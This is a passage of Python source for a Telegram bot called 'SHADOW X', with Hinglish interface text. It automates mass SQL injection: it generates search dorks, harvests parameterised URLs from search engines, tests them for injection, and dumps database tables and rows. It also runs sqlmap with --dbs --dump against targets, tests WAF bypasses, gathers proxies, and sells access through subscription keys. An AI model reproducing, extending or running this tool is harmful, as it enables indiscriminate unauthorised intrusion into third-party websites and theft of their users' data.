    if "{site}" in d:
        d = d.replace("{site}", random.choice(sites) if sites else "example.com")
    if "{keyword}" in d:
        d = d.replace("{keyword}", random.choice(kws) if kws else "shop")
    if "{page_type}" in d:
        d = d.replace("{page_type}", random.choice(ptypes) if ptypes else "product.php")
    if "{page_parameter}" in d:
        d = d.replace("{page_parameter}", random.choice(pparams) if pparams else "id")
    d = d.replace("{search_function}", "").replace("{", "").replace("}", "")
    return re.sub(r"\s+", " ", d).strip()


def gen_dorks(count=500):
    """Pehle patterns.txt se (phone pe pada hua), phir built-in templates se."""
    sites = res_lines("sites")
    ptypes = res_lines("page_types")
    pparams = res_lines("page_parameters")
    pats = res_lines("patterns")
    kws = [k for k in res_lines("keywords") if len(k) < 40] or \
          ["shop", "store", "product", "login", "admin", "news"]
    out, seen = [], set()

    if pats:
        for _ in range(count * 20 + 500):
            if len(out) >= count:
                break
            d = _fill_pattern(random.choice(pats), sites, kws, ptypes, pparams)
            if 10 < len(d) < 400 and d not in seen:
                seen.add(d)
                out.append(d)

    for _ in range(count * 8 + 200):
        if len(out) >= count:
            break
        t = random.choice(DORK_TEMPLATES)
        d = (t.replace("{param}", random.choice(DORK_PARAMS))
              .replace("{tld}", random.choice(DORK_TLDS))
              .replace("{kw}", random.choice(kws)))
        d = re.sub(r"\s+", " ", d).strip()
        if 10 < len(d) < 400 and d not in seen:
            seen.add(d)
            out.append(d)
    return out[:count]


# ══════════════════════════════════════════════════════════════════════════════
#  SCREENS
# ══════════════════════════════════════════════════════════════════════════════
def main_text(uid) -> str:
    u = jload("users", {}).get(str(uid), {}) or {}
    exp = u.get("expires", 0)
    left = "—" if not exp else (f"{max(0, int(exp - time.time()) // 86400)}d")
    return (H("SHADOW X", f"{VERSION} • fixed build") + "\n\n"
            + f"👤 <b>@{esc(u.get('username') or 'user')}</b>\n"
            + KV("Plan", f"<code>{left}</code>", "🎫") + "\n"
            + KV("Parser URLs", f"<code>{fmt(len(u.get('last_urls') or []))}</code>", "🔗") + "\n"
            + KV("Vulns", f"<code>{fmt(len(u.get('last_vulns') or []))}</code>", "💉") + "\n\n"
            + P("Pipeline: keywords → dorks → parser → injector → dumper"))


def main_kb() -> types.InlineKeyboardMarkup:
    return kb([
        [sbtn("🚀 FULL PIPELINE", "pipe", "success")],
        [sbtn("🧠 HQ KEYWORDS", "kw"), sbtn("🧬 DORKER", "dork")],
        [sbtn("🌐 PARSER", "parse"), sbtn("💉 INJECTOR", "inj")],
        [sbtn("📥 DUMPER", "dump", "success"), sbtn("🎯 QUALITY CHECK", "qc")],
        [sbtn("🛡 WAF LAB", "waf"), sbtn("🕸 SUBFINDER", "subs")],
        [sbtn("🧅 PROXIES", "proxy"), sbtn("🗂 MY FILES", "files")],
        [sbtn("⚙️ SETTINGS", "cfg"), sbtn("☎️ SUPPORT", "support")],
    ])


def back_kb(to="home"):
    return kb([[sbtn("⬅️ BACK", to)]])


def open_main(chat_id):
    send(chat_id, main_text(chat_id), main_kb())


def screen_kw(chat_id):
    rs = res_status()
    kb_ = rs.get("keywords", 0)
    send(chat_id, H("HQ KEYWORDS", "seed → UHQ keywords") + "\n\n"
         + (KV("keywords.txt", f"<code>{fmt(kb_)} seeds</code>", "📂") + "\n" if kb_ else "")
         + P("Apne seed keywords bhejo — ek line me ek. Bot inhe expand karega.")
         + "\n\n<code>shoes\nwatch\nlaptop</code>", back_kb())
    wait_for(chat_id, "kw_seed")


def screen_dork(chat_id):
    rs = res_status()
    src = (f"<code>patterns {rs.get('patterns', 0)} · sites {rs.get('sites', 0)} · "
           f"kw {rs.get('keywords', 0)}</code>") if rs.get("patterns") else "<i>built-in templates</i>"
    send(chat_id, H("DORKER", "param dorks") + "\n\n"
         + KV("Templates", f"<code>{len(DORK_TEMPLATES)}</code>", "🧬") + "\n"
         + KV("Params", f"<code>{len(DORK_PARAMS)}</code>", "🎯") + "\n"
         + KV("Sources", src, "📂") + "\n\n"
         + P("Kitne dorks chahiye? 100 – 50,000."),
         kb([[sbtn("500", "dork:500", "success"), sbtn("2000", "dork:2000", "success")],
             [sbtn("10000", "dork:10000", "success")], [sbtn("⬅️ BACK", "home")]]))
    wait_for(chat_id, "dork_count")


def screen_parse(chat_id):
    engines = sget("engines", ["ddg", "bing", "yahoo"])
    send(chat_id, H("PARSER", "dorks → URLs") + "\n\n"
         + KV("Engines", f"<code>{esc(', '.join(engines))}</code>", "🌐") + "\n"
         + KV("Pages/dork", f"<code>{sget('pages', 1)}</code>", "📄") + "\n"
         + KV("Threads", f"<code>{sget('threads', 12)}</code>", "🧵") + "\n"
         + KV("Only params", ("✅ ON" if sget("only_params", 1) else "⚪ OFF"), "🔗") + "\n\n"
         + P("Dorks bhejo (text ya .txt) — ya LAST dorks se chalao."),
         kb([[sbtn("▶️ LAST DORKS", "parse:last", "success")],
             [sbtn("⚙️ ENGINES", "cfg:eng"), sbtn("🔗 PARAM ONLY", "cfg:param")],
             [sbtn("⬅️ BACK", "home")]]))
    wait_for(chat_id, "parse_dorks")


def screen_inj(chat_id):
    send(chat_id, H("INJECTOR", "real SQLi detect") + "\n\n"
         + KV("Threads", f"<code>{sget('inj_threads', 20)}</code>", "🧵") + "\n"
         + KV("Timeout", f"<code>{sget('timeout', 8)}s</code>", "⏱") + "\n"
         + KV("Tests", "error + boolean + time", "🧪") + "\n\n"
         + P("URLs bhejo (text/.txt) — ya LAST parser URLs."),
         kb([[sbtn("▶️ LAST URLS", "inj:last", "success")],
             [sbtn("⬅️ BACK", "home")]]))
    wait_for(chat_id, "inj_urls")


def screen_dump(chat_id):
    send(chat_id, H("DUMPER", "DB se ASLI rows") + "\n\n"
         + KV("Tables / URL", f"<code>{sget('dump_tables', 8)}</code>", "🗃") + "\n"
         + KV("Rows / table", f"<code>{sget('dump_rows', 10)}</code>", "📄") + "\n\n"
         + P("Vulnerable URLs bhejo — ya LAST vuln list (inj:last se)."),
         kb([[sbtn("▶️ LAST VULN URLS", "dump:last", "success")],
             [sbtn("🐍 SQLMAP", "sqlmap", "success")],
             [sbtn("⬅️ BACK", "home")]]))
    wait_for(chat_id, "dump_urls")


def screen_cfg(chat_id):
    send(chat_id, H("SETTINGS", "speed + filters") + "\n\n"
         + KV("Threads", f"<code>{sget('threads', 12)}</code>", "🧵") + "\n"
         + KV("Pages", f"<code>{sget('pages', 1)}</code>", "📄") + "\n"
         + KV("Timeout", f"<code>{sget('timeout', 8)}s</code>", "⏱") + "\n"
         + KV("Only params", ("✅ ON" if sget("only_params", 1) else "⚪ OFF"), "🔗"),
         kb([[sbtn("🧵 THREADS", "cfg:threads"), sbtn("📄 PAGES", "cfg:pages")],
             [sbtn("🔗 PARAM ONLY", "cfg:param"), sbtn("🌐 ENGINES", "cfg:eng")],
             [sbtn("⬅️ BACK", "home")]]))


# ══════════════════════════════════════════════════════════════════════════════
#  RUNNERS (thread me — UI block nahi hota)
# ══════════════════════════════════════════════════════════════════════════════
def run_parse(chat_id, uid, dorks, tid):
    def work():
        msg = send(chat_id, H("PARSER", "running") + "\n\n"
                   + f"🧬 Dorks: <code>{fmt(len(dorks))}</code>", stop_kb(tid))
        last = {"t": 0.0}

        async def prog(done, total, found):
            now = time.time()
            if now - last["t"] < 2:
                return
            last["t"] = now
            if msg:
                edit(chat_id, msg.message_id,
                     H("PARSER", "live") + f"\n\n{bar(done, total)} <b>{int(done * 100 / max(1, total))}%</b>\n\n"
                     + f"🧬 Dorks : <code>{done}/{total}</code>\n"
                     + f"🔗 URLs  : <code>{fmt(found)}</code>", stop_kb(tid))

        try:
            urls = asyncio.run(parse_dorks(
                dorks, uid, tid, engines=sget("engines", ["ddg", "bing", "yahoo"]),
                pages=int(sget("pages", 1)), threads=int(sget("threads", 12)), progress=prog))
        except Exception:
            traceback.print_exc()
            urls = []
        if sget("only_params", 1):
            urls = only_params(urls)
        u = jload("users", {}).get(str(uid), {}) or {}
        u["last_urls"] = urls[:5000]
        users = jload("users", {})
        users[str(uid)] = u
        jsave("users", users)
        task_upd(tid, done=len(dorks), total=len(dorks),
                 status=("stopped" if stopped(tid) else "done"))
        if msg:
            try:
                bot.delete_message(chat_id, msg.message_id)
            except Exception:
                pass
        if urls:
            path = write_file(urls, "urls", f"SHADOW X — {len(urls)} URLs")
            send_file(chat_id, path, f"🔗 {len(urls)} URLs")
            send(chat_id, H("PARSER — DONE") + f"\n\n🔗 URLs: <code>{fmt(len(urls))}</code>",
                 kb([[sbtn("💉 INJECTOR", "inj", "success")], [sbtn("⬅️ HOME", "home")]]))
        else:
            send(chat_id, H("PARSER — 0 URLs") + "\n\n"
                 + P("Engines block ya dorks strict. /cfg me engines badlo, fresh dorks lo."),
                 back_kb())

    threading.Thread(target=work, daemon=True).start()


def run_inject(chat_id, uid, urls, tid):
    def work():
        msg = send(chat_id, H("INJECTOR", "running") + "\n\n"
                   + f"🔗 URLs: <code>{fmt(len(urls))}</code>", stop_kb(tid))
        last = {"t": 0.0}

        async def prog(done, total, vulns):
            now = time.time()
            if now - last["t"] < 2:
                return
            last["t"] = now
            if msg:
                edit(chat_id, msg.message_id,
                     H("INJECTOR", "live") + f"\n\n{bar(done, total)} <b>{int(done * 100 / max(1, total))}%</b>\n\n"
                     + f"🔗 Tested : <code>{done}/{total}</code>\n"
                     + f"💉 Vulns  : <code>{len(vulns)}</code>", stop_kb(tid))

        try:
            res = asyncio.run(inject_all(urls, uid, tid, prog,
                                         threads=int(sget("inj_threads", 20)),
                                         timeout=int(sget("timeout", 8))))
        except Exception:
            traceback.print_exc()
            res = {"vulns": [], "safe": urls, "done": 0}
        vulns = res["vulns"]
        users = jload("users", {})
        u = users.get(str(uid), {}) or {}
        u["last_vulns"] = [v["url"] for v in vulns]
        users[str(uid)] = u
        jsave("users", users)
        task_upd(tid, done=res["done"], total=len(urls),
                 status=("stopped" if stopped(tid) else "done"))
        if msg:
            try:
                bot.delete_message(chat_id, msg.message_id)
            except Exception:
                pass
        if vulns:
            lines = [f"{v['url']} | {v['param']} | {v['tech']} | {v['dbms']} | {v['waf'] or '-'}" for v in vulns]
            path = write_file(lines, "vulns", f"SHADOW X — {len(vulns)} vulnerable")
            send_file(chat_id, path, f"💉 {len(vulns)} vulnerable URLs")
            body = H("INJECTOR — DONE") + f"\n\n💉 Vulnerable: <code>{fmt(len(vulns))}</code>\n"
            for v in vulns[:6]:
                body += (f"\n<b>{esc(v['url'][:70])}</b>\n"
                         f"   <i>{esc(v['param'])} · {esc(v['tech'])} · {esc(v['dbms'])}"
                         + (f" · tamper {esc(v['tamper'])}" if v.get("tamper") else "")
                         + "</i>")
            send(chat_id, body, kb([[sbtn("📥 DUMP THESE", "dump:last", "success")],
                                    [sbtn("⬅️ HOME", "home")]]))
        else:
            send(chat_id, H("INJECTOR — 0 vulns") + "\n\n"
                 + P("Sab URL clean mile. Volume badhao (2000+ URLs), ya WAF LAB se dekho."),
                 back_kb())

    threading.Thread(target=work, daemon=True).start()


def run_dump(chat_id, uid, urls, tid):
    def work():
        msg = send(chat_id, H("DUMPER", "extracting") + "\n\n"
                   + f"🔗 Targets: <code>{fmt(len(urls))}</code>", stop_kb(tid))
        results = []

        async def work_async():
            connector = aiohttp.TCPConnector(limit=6, ssl=False, force_close=True)
            async with aiohttp.ClientSession(connector=connector) as session:
                for i, u in enumerate(urls, 1):
                    if stopped(tid):
                        break
                    det = await detect_sqli(session, u, int(sget("timeout", 8)))
                    if not det:
                        continue
                    det["tid"] = tid
                    r = await dump_one(session, det,
                                       tables=int(sget("dump_tables", 8)),
                                       rows=int(sget("dump_rows", 10)))
                    results.append(r)
                    if msg:
                        edit(chat_id, msg.message_id,
                             H("DUMPER", "live") + f"\n\n{bar(i, len(urls))}\n\n"
                             + f"🔗 Done  : <code>{i}/{len(urls)}</code>\n"
                             + f"💾 DBs   : <code>{len(results)}</code>\n"
                             + f"📋 Rows  : <code>{sum(x['rows'] for x in results)}</code>",
                             stop_kb(tid))

        try:
            asyncio.run(work_async())
        except Exception:
            traceback.print_exc()
        task_upd(tid, done=len(urls), total=len(urls),
                 status=("stopped" if stopped(tid) else "done"))
        if msg:
            try:
                bot.delete_message(chat_id, msg.message_id)
            except Exception:
                pass
        if not results:
            send(chat_id, H("DUMPER — 0") + "\n\n" + P("Koi error-based output nahi mila."), back_kb())
            return
        lines = []
        for r in results:
            lines.append("=" * 60)
            lines.append(f"URL  : {r['url']}")
            lines.append(f"DB   : {r.get('db') or '-'}   DBMS: {r.get('dbms')}   WAF: {r.get('waf') or '-'}")
            lines.append(f"VER  : {r.get('version') or '-'}")
            if r.get("note"):
                lines.append(f"NOTE : {r['note']}")
            for t, e in r["tables"].items():
                lines.append(f"- TABLE {t}  COLS: {', '.join(e['cols'])}")
                lines.extend("   " + row for row in e["rows"])
        path = write_file(lines, "sqldump", "SHADOW X — SQL dump")
        send_file(chat_id, path, f"📥 {len(results)} DB(s) · {sum(r['rows'] for r in results)} rows")
        body = H("DUMPER — DONE") + f"\n\n💾 Databases: <code>{len(results)}</code>\n"
        for r in results[:5]:
            body += (f"\n<b>{esc(urlparse(r['url']).netloc)}</b>\n"
                     f"   <i>{esc(r.get('db') or '-')} · {len(r['tables'])} tables · {r['rows']} rows</i>")
        send(chat_id, body, back_kb())

    threading.Thread(target=work, daemon=True).start()


# ══════════════════════════════════════════════════════════════════════════════
#  SQLMAP (optional — local Termux/VPS pe install ho to chalega)
#  python3 -m pip install sqlmap
# ══════════════════════════════════════════════════════════════════════════════
def sqlmap_cmd_base():
    """sqlmap ka command — PATH -> package -> nahi mila ([])."""
    import shutil
    exe = shutil.which("sqlmap")
    if exe:
        return [exe]
    try:
        import importlib
        mod = importlib.import_module("sqlmap")
        p = os.path.join(os.path.dirname(os.path.abspath(mod.__file__)), "sqlmap.py")
        if os.path.exists(p):
            return [sys.executable, p]
    except Exception:
        pass
    return []


def sqlmap_version(base):
    try:
        import subprocess
        r = subprocess.run(base + ["--version"], capture_output=True, text=True, timeout=25)
        return (r.stdout or r.stderr or "").strip().splitlines()[0][:60]
    except Exception:
        return "?"


def run_sqlmap(chat_id, uid, urls, tid):
    def work():
        base = sqlmap_cmd_base()
        if not base:
            send(chat_id, H("SQLMAP", "install nahi hai") + "\n\n"
                 + P("Termux: pip install sqlmap   |   VPS: sudo apt install sqlmap")
                 + "\n" + P("Ya native 📥 DUMPER use karo (sqlmap ki zaroorat nahi)."),
                 back_kb("dump"))
            task_upd(tid, status="done")
            return
        import subprocess
        targets = [u for u in urls if u.startswith("http")][:10]
        stamp = time.strftime("%Y%m%d_%H%M%S")
        outdir = os.path.join(DUMP_DIR, "sqlmap_" + stamp)
        os.makedirs(outdir, exist_ok=True)
        msg = send(chat_id, H("SQLMAP", "running") + "\n\n"
                   + KV("Targets", f"<code>{len(targets)}</code>", "🎯") + "\n"
                   + KV("Engine", f"<code>{esc(os.path.basename(base[0]))}</code>", "🐍"),
                   stop_kb(tid))
        hits = 0
        for i, u in enumerate(targets, 1):
            if stopped(tid):
                break
            if msg:
                edit(chat_id, msg.message_id,
                     H("SQLMAP", "live") + f"\n\n{bar(i - 1, len(targets))} {i - 1}/{len(targets)}\n\n"
                     + f"🎯 {esc(u[:70])}\n💾 extracted: <code>{hits}</code>", stop_kb(tid))
            cmd = base + [u, "--batch", "--non-interactive", "--dbs", "--dump",
                          "--level", "2", "--risk", "2", "--threads", "4",
                          "--timeout", "10", "--retries", "1", "--random-agent",
                          "--output-dir", outdir, "--flush-session"]
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
                blob = ((r.stdout or "") + (r.stderr or "")).lower()
                if "extracted" in blob or "fetched data" in blob:
                    hits += 1
            except subprocess.TimeoutExpired:
                pass
            except Exception:
                traceback.print_exc()
        task_upd(tid, done=len(targets), total=len(targets),
                 status=("stopped" if stopped(tid) else "done"))
        if msg:
            try:
                bot.delete_message(chat_id, msg.message_id)
            except Exception:
                pass
        files = []
        for root, _dirs, fs in os.walk(outdir):
            for f in fs:
                files.append(os.path.join(root, f))
        if files:
            import zipfile
            zp = os.path.join(DUMP_DIR, f"sqlmap_{stamp}.zip")
            with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
                for f in files:
                    z.write(f, os.path.relpath(f, outdir))
            send_file(chat_id, zp, f"🐍 sqlmap — {len(files)} files · {hits} extracted")
            send(chat_id, H("SQLMAP — DONE") + f"\n\n💾 Extracted: <code>{hits}</code>\n"
                 f"📄 Files: <code>{len(files)}</code>", back_kb("dump"))
        else:
            send(chat_id, H("SQLMAP — 0") + "\n\n"
                 + P("Kuch nahi nikla — URL error-based blind ho sakta hai, ya WAF block."),
                 back_kb("dump"))

    threading.Thread(target=work, daemon=True).start()


# ══════════════════════════════════════════════════════════════════════════════
#  PIPELINE (auto: dorks → urls → vulns → dump)
# ══════════════════════════════════════════════════════════════════════════════
def run_pipeline(chat_id, uid):
    tid = task_new(uid, "pipeline", 3, "Full pipeline")

    def work():
        msg = send(chat_id, H("PIPELINE", "step 1/3 — dorks"), stop_kb(tid))
        dorks = gen_dorks(int(sget("pipe_dorks", 400)))
        if msg:
            edit(chat_id, msg.message_id, H("PIPELINE", "step 2/3 — parser") + "\n\n"
                 + f"🧬 Dorks: <code>{len(dorks)}</code>", stop_kb(tid))
        try:
            urls = asyncio.run(parse_dorks(dorks, uid, tid,
                                           engines=sget("engines", ["ddg", "bing", "yahoo"]),
                                           pages=int(sget("pages", 1)),
                                           threads=int(sget("threads", 12))))
        except Exception:
            traceback.print_exc()
            urls = []
        if sget("only_params", 1):
            urls = only_params(urls)
        if not urls:
            task_upd(tid, status="done")
            if msg:
                try:
                    bot.delete_message(chat_id, msg.message_id)
                except Exception:
                    pass
            send(chat_id, H("PIPELINE", "0 URLs") + "\n\n" + P("Engines block — dorks/engines badlo."),
                 back_kb())
            return
        if msg:
            edit(chat_id, msg.message_id, H("PIPELINE", "step 3/3 — injector") + "\n\n"
                 + f"🔗 URLs: <code>{len(urls)}</code>", stop_kb(tid))
        try:
            res = asyncio.run(inject_all(urls, uid, tid,
                                         threads=int(sget("inj_threads", 20)),
                                         timeout=int(sget("timeout", 8))))
        except Exception:
            traceback.print_exc()
            res = {"vulns": []}
        vulns = res.get("vulns") or []
        users = jload("users", {})
        u = users.get(str(uid), {}) or {}
        u["last_urls"] = urls[:5000]
        u["last_vulns"] = [v["url"] for v in vulns]
        users[str(uid)] = u
        jsave("users", users)
        task_upd(tid, status="done", done=3)
        if msg:
            try:
                bot.delete_message(chat_id, msg.message_id)
            except Exception:
                pass
        body = (H("PIPELINE — DONE") + f"\n\n🧬 Dorks : <code>{len(dorks)}</code>\n"
                f"🔗 URLs  : <code>{len(urls)}</code>\n💉 Vulns : <code>{len(vulns)}</code>")
        send(chat_id, body, kb([[sbtn("📥 DUMP", "dump:last", "success")] if vulns else
                                [sbtn("⬅️ HOME", "home")],
                                [sbtn("⬅️ HOME", "home")]]))

    threading.Thread(target=work, daemon=True).start()


# ══════════════════════════════════════════════════════════════════════════════
#  CALLBACKS
# ══════════════════════════════════════════════════════════════════════════════
@bot.callback_query_handler(func=lambda c: True)
@safe
def on_cb(call):
    uid = call.from_user.id
    chat = call.message.chat.id
    data = call.data or ""
    answer(call)

    if data == "home":
        open_main(chat)
        return
    if data == "kw":
        screen_kw(chat)
        return
    if data == "dork":
        screen_dork(chat)
        return
    if data.startswith("dork:"):
        n = int(data.split(":")[1])
        kb_ = gen_dorks(n)
        path = write_file(kb_, "dorks", f"SHADOW X — {n} dorks")
        send_file(chat, path, f"🧬 {len(kb_)} dorks")
        send(chat, H("DORKER — DONE") + f"\n\n🧬 <code>{len(kb_)}</code> dorks", back_kb())
        return
    if data == "parse":
        screen_parse(chat)
        return
    if data == "parse:last":
        dorks = jload("last", {}).get("dorks") or []
        if not dorks:
            send(chat, "❌ Pehle dorker chalao.", back_kb())
            return
        run_parse(chat, uid, dorks, task_new(uid, "parse", len(dorks), "Parser"))
        return
    if data == "inj":
        screen_inj(chat)
        return
    if data == "inj:last":
        urls = (jload("users", {}).get(str(uid), {}) or {}).get("last_urls") or []
        if not urls:
            send(chat, "❌ Pehle parser chalao.", back_kb())
            return
        run_inject(chat, uid, urls, task_new(uid, "inj", len(urls), "Injector"))
        return
    if data == "dump":
        screen_dump(chat)
        return
    if data == "sqlmap":
        base = sqlmap_cmd_base()
        send(chat, H("SQLMAP", "external engine") + "\n\n"
             + KV("Status", ("✅ " + esc(os.path.basename(base[0]))) if base else "❌ install nahi",
                  "🐍") + "\n"
             + KV("Install", "<code>pip install sqlmap</code>", "📦") + "\n\n"
             + P("URLs bhejo (max 10). Har URL pe --dbs --dump chalega."),
             back_kb("dump"))
        wait_for(uid, "sqlmap_urls")
        return
    if data == "dump:last":
        vulns = (jload("users", {}).get(str(uid), {}) or {}).get("last_vulns") or []
        if not vulns:
            send(chat, "❌ Pehle injector chalao (koi vuln nahi).", back_kb())
            return
        run_dump(chat, uid, vulns, task_new(uid, "dump", len(vulns), "Dumper"))
        return
    if data == "qc":
        send(chat, H("QUALITY CHECK", "URLs → score") + "\n\n" + P("URLs bhejo (text/.txt)."),
             back_kb())
        wait_for(uid, "qc_urls")
        return
    if data == "waf":
        send(chat, H("WAF LAB", "detect + bypass test") + "\n\n" + P("URLs bhejo."), back_kb())
        wait_for(uid, "waf_urls")
        return
    if data == "subs":
        send(chat, H("SUBFINDER", "crt.sh") + "\n\n" + P("Domain bhejo: <code>example.com</code>"),
             back_kb())
        wait_for(uid, "subs_dom")
        return
    if data == "proxy":
        send(chat, H("PROXIES", "hunt + check") + "\n\n"
             + KV("Saved", f"<code>{fmt(len(jload('proxies', {}).get(str(uid), [])))}</code>", "🧅"),
             kb([[sbtn("⚡ HUNT", "proxy:hunt", "success"), sbtn("✅ CHECK", "proxy:check")],
                 [sbtn("⬅️ BACK", "home")]]))
        return
    if data == "proxy:hunt":
        def hunt():
            send(chat, "🧅 Hunting proxies…")
            raw = proxy_hunt(int(sget("proxy_hunt", 800)))
            live = asyncio.run(proxy_check(raw))
            d = jload("proxies", {})
            d[str(uid)] = live[:5000]
            jsave("proxies", d)
            send(chat, H("PROXIES", "hunt done") + f"\n\n📥 Raw: <code>{len(raw)}</code>\n"
                 f"🟢 Live: <code>{len(live)}</code>", back_kb())
        threading.Thread(target=hunt, daemon=True).start()
        return
    if data == "proxy:check":
        send(chat, "🧅 Proxies bhejo check karne ke liye.")
        wait_for(uid, "proxy_check")
        return
    if data == "cfg":
        screen_cfg(chat)
        return
    if data == "cfg:param":
        v = 0 if sget("only_params", 1) else 1
        sset("only_params", v)
        send(chat, f"🔗 Only params: <b>{'ON' if v else 'OFF'}</b>", back_kb())
        return
    if data == "cfg:eng":
        cur = sget("engines", ["ddg", "bing", "yahoo"])
        rows = []
        for e in ENGINES:
            mark = "✅ " if e in cur else ""
            rows.append([sbtn(f"{mark}{ENGINE_LABEL[e]}", "cfg:eng:" + e)])
        rows.append([sbtn("⬅️ BACK", "cfg")])
        send(chat, H("ENGINES", "toggle"), kb(rows))
        return
    if data.startswith("cfg:eng:"):
        e = data.split(":")[2]
        cur = list(sget("engines", ["ddg", "bing", "yahoo"]))
        cur.remove(e) if e in cur else cur.append(e)
        sset("engines", cur or ["ddg"])
        send(chat, f"🌐 Engines: <code>{esc(', '.join(cur))}</code>", back_kb("cfg"))
        return
    if data == "cfg:threads":
        send(chat, "🧵 Threads (5–100):")
        wait_for(uid, "cfg_threads")
        return
    if data == "cfg:pages":
        send(chat, "📄 Pages per dork (1–5):")
        wait_for(uid, "cfg_pages")
        return
    if data == "files":
        send(chat, H("MY FILES", "dumps") + "\n\n" + P("Dumper ke baad files yahan aati hain."),
             back_kb())
        return
    if data == "support":
        send(chat, H("SUPPORT", "message") + "\n\n" + P("Apna message likho — owner ko jayega."),
             back_kb())
        wait_for(uid, "support_msg")
        return
    if data == "pipe":
        run_pipeline(chat, uid)
        return
    if data.startswith("stop:"):
        t = data.split(":", 1)[1]
        task_stop(t)
        answer(call, "⛔ Stopping…", True)
        return
    if data == "admin":
        if not is_admin(uid):
            answer(call, "Admin only", True)
            return
        admin_screen(chat)
        return
    if data.startswith("adm:"):
        if not is_admin(uid):
            return
        admin_action(chat, uid, data)
        return


# ══════════════════════════════════════════════════════════════════════════════
#  ADMIN
# ══════════════════════════════════════════════════════════════════════════════
def admin_screen(chat):
    users = jload("users", {}) or {}
    send(chat, H("ADMIN", "owner panel") + "\n\n"
         + KV("Users", f"<code>{fmt(len(users))}</code>", "👥") + "\n"
         + KV("Version", f"<code>{VERSION}</code>", "📦"),
         kb([[sbtn("🔑 NEW KEY", "adm:key", "success"), sbtn("📊 STATS", "adm:stats")],
             [sbtn("📢 BROADCAST", "adm:bcast"), sbtn("🗂 USERS", "adm:users")],
             [sbtn("⬅️ HOME", "home")]]))


def admin_action(chat, uid, data):
    if data == "adm:stats":
        users = jload("users", {}) or {}
        tasks = jload("tasks", {}) or {}
        send(chat, H("STATS") + f"\n\n👥 Users: <code>{len(users)}</code>\n"
             f"🗂 Tasks: <code>{len(tasks)}</code>\n"
             f"🟢 Running: <code>{sum(1 for t in tasks.values() if t.get('status') == 'running')}</code>",
             back_kb("admin"))
        return
    if data == "adm:key":
        key = "SHX-" + "%04X" % random.randint(0, 0xFFFF) + "-" + "%04X" % random.randint(0, 0xFFFF)
        keys = jload("keys", {}) or {}
        keys[key] = {"days": int(sget("key_days", 7)), "created": int(time.time()), "used_by": None}
        jsave("keys", keys)
        send(chat, H("KEY CREATED") + f"\n\n<code>{key}</code>", back_kb("admin"))
        return
    if data == "adm:users":
        users = jload("users", {}) or {}
        lines = [f"• <code>{k}</code> @{esc((v or {}).get('username') or '-')}"
                 for k, v in list(users.items())[-20:]]
        send(chat, H("USERS", f"{len(users)} total") + "\n\n" + ("\n".join(lines) or "—"),
             back_kb("admin"))
        return
    if data == "adm:bcast":
        send(chat, "📢 Broadcast message likho:")
        wait_for(uid, "adm_bcast")
        return


# ══════════════════════════════════════════════════════════════════════════════
#  TEXT INPUT
# ══════════════════════════════════════════════════════════════════════════════
def read_lines(msg):
    if msg.document:
        try:
            f = bot.get_file(msg.document.file_id)
            data = bot.download_file(f.file_path)
            return [x.strip() for x in data.decode("utf-8", "ignore").splitlines() if x.strip()]
        except Exception:
            return []
    return [x.strip() for x in (msg.text or "").splitlines() if x.strip()]


@bot.message_handler(content_types=["text", "document"],
                     func=lambda m: m.from_user.id in AWAIT)
@safe
def on_input(msg):
    uid = msg.from_user.id
    chat = msg.chat.id
    key = wait_pop(uid)
    lines = read_lines(msg)
    text = (msg.text or "").strip()

    if key == "kw_seed":
        seed = lines[:300]
        if not seed:
            send(chat, "❌ Keywords khali hain.")
            wait_for(uid, "kw_seed")
            return
        kws = gen_keywords(seed, int(sget("kw_count", 500)))
        path = write_file(kws, "keywords", "SHADOW X — keywords")
        send_file(chat, path, f"🧠 {len(kws)} keywords")
        send(chat, H("KEYWORDS — DONE") + f"\n\n🧠 <code>{len(kws)}</code>", back_kb())
        return

    if key == "dork_count":
        try:
            n = max(10, min(50000, int(text.replace(",", ""))))
        except Exception:
            send(chat, "❌ Number likho.")
            wait_for(uid, "dork_count")
            return
        dorks = gen_dorks(n)
        d = jload("last", {})
        d["dorks"] = dorks
        jsave("last", d)
        path = write_file(dorks, "dorks", "SHADOW X — dorks")
        send_file(chat, path, f"🧬 {len(dorks)} dorks")
        send(chat, H("DORKER — DONE") + f"\n\n🧬 <code>{len(dorks)}</code>", back_kb())
        return

    if key == "parse_dorks":
        dorks = lines
        if not dorks:
            send(chat, "❌ Dorks khali.")
            return
        d = jload("last", {})
        d["dorks"] = dorks
        jsave("last", d)
        run_parse(chat, uid, dorks, task_new(uid, "parse", len(dorks), "Parser"))
        return

    if key == "inj_urls":
        urls = [u for u in lines if u.startswith("http")]
        if not urls:
            send(chat, "❌ Full URLs bhejo (https://…).")
            return
        run_inject(chat, uid, urls, task_new(uid, "inj", len(urls), "Injector"))
        return

    if key == "dump_urls":
        urls = [u for u in lines if u.startswith("http")]
        if not urls:
            send(chat, "❌ URLs bhejo.")
            return
        run_dump(chat, uid, urls, task_new(uid, "dump", len(urls), "Dumper"))
        return

    if key == "sqlmap_urls":
        urls = [u for u in lines if u.startswith("http")]
        if not urls:
            send(chat, "❌ URLs bhejo (https://…).")
            return
        run_sqlmap(chat, uid, urls, task_new(uid, "sqlmap", min(10, len(urls)), "sqlmap"))
        return

    if key == "qc_urls":
        urls = [u for u in lines if u.startswith("http")]
        if not urls:
            send(chat, "❌ URLs bhejo.")
            return
        tid = task_new(uid, "qc", len(urls), "QC")

        def work():
            res = asyncio.run(qc_urls(urls, uid, tid))
            task_upd(tid, status="done")
            top = [f"{u} | {s} | {n} | {st}" for u, s, n, st in res]
            path = write_file(top, "qc", "SHADOW X — QC")
            send_file(chat, path, f"🎯 {len(top)} scored")
            good = [u for u, s, _, _ in res if s >= 60]
            send(chat, H("QC — DONE") + f"\n\n✅ Usable: <code>{len(good)}</code>\n"
                 f"📉 Total: <code>{len(res)}</code>", back_kb())
        threading.Thread(target=work, daemon=True).start()
        return

    if key == "waf_urls":
        urls = [u for u in lines if u.startswith("http")]
        if not urls:
            send(chat, "❌ URLs bhejo.")
            return

        def work():
            res = asyncio.run(waf_scan(urls))
            body = H("WAF LAB — DONE") + "\n\n"
            for r in res[:12]:
                body += (f"<b>{esc(urlparse(r['url']).netloc)}</b>\n"
                         f"   🛡 {esc(r['waf'])} · bypass: <code>{esc(r['bypass'])}</code>\n")
            send(chat, body, back_kb())
        threading.Thread(target=work, daemon=True).start()
        return

    if key == "subs_dom":
        dom = text.replace("https://", "").replace("http://", "").split("/")[0]
        if "." not in dom:
            send(chat, "❌ Domain galat.")
            return

        def work():
            names = subfinder(dom)
